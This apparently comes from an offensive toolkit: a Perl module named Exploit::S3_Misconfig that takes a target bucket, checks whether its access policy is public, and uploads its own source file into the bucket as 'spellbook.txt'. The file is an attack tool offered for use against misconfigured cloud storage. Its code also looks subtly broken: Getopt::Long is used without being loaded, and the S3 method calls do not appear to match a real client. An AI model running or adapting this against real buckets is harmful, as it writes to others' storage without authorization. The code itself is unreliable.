package Spellbook::Exploit::S3_Misconfig {
    use strict;
    use warnings;
    use Amazon::S3;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"     => \$help,
            "t|target=s" => \$target
        );

        if ($target) {
            my $s3_bucket   = Amazon::S3 -> new();
            my $access_policy = $s3_bucket -> acl($target);

            if ($access_policy -> is_public) {
                my $response = $s3_bucket -> upload_file("./lib/Spellbook/Exploit/S3_Misconfig.pm", $target, "spellbook.txt");
                
                if ($response -> is_success) {
                    print "File uploaded successfully.\n";
                } 
            }
        }

        if ($help) {
            return "
                \rExploit::S3_Misconfig
                \r=======================
                \r-h, --help     See this menu
                \r-t, --target   Define a target
            ";
        }

        return 0;
    }
}

1;